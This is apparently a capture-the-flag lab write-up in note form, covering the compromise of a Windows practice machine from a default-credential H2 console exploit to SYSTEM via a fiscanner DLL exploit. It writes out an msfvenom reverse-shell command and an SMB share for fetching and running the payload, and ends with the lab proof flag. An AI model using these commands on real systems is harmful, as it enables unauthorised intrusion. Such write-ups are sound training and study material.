# IP

TARGET

```
192.168.53.66
```

ME

```
192.168.49.53
```


# NMAP

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8082/tcp  open  blackice-alerts
9092/tcp  open  XmlIpcRegSvc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

```

```

# Port 8082

Port 80 shows us that H2 SQL console should be running on port 8082

Was able to login as sa (admin) user on database without a password using pre-filled default config

Found https://www.exploit-db.com/exploits/49384

Create and load a DLL which is a javascript JNI evaluation engine

Using this, got command execution for whoami

Need to execute a whole reverse shell

Used msfvenom to create a shell as an EXE:

```msfvenom-windows-exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.53 LPORT=9000 -f exe -a x64 --platform windows -b '\x00' -e x64/xor_dynamic -o shell.exe
```

Then used impacket's smbserver with -smb2support flag and a share named test to host shell.exe

```
impacket-smbserver -smb2support test .
```

This can be accessed by just replacing exec() argument with `//192.168.49.53/test/shell.exe`

Got back a connection as `jacko/tony` user with cmd on port 9000

# Privilege escalation

Already saw SeImpersonatePrivilege on current user
Ran winpeas to find any good services
Didn't quite see much

check out Program Files for programs

Found in ProgramFiles (x86) aka a 32 bit compiled program of fiscanner - found [exploit](https://www.exploit-db.com/exploits/49382)
Using this exploit and msfvenom to compile an x86 arch dll, using the same SMB share to move file around:

Got shell as system:

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
868a020233cd40304f5614f4faeff94a

```


It seems due to SeImpersonatePrivilege that [GodPotato](https://github.com/BeichenDream/GodPotato) could have worked too...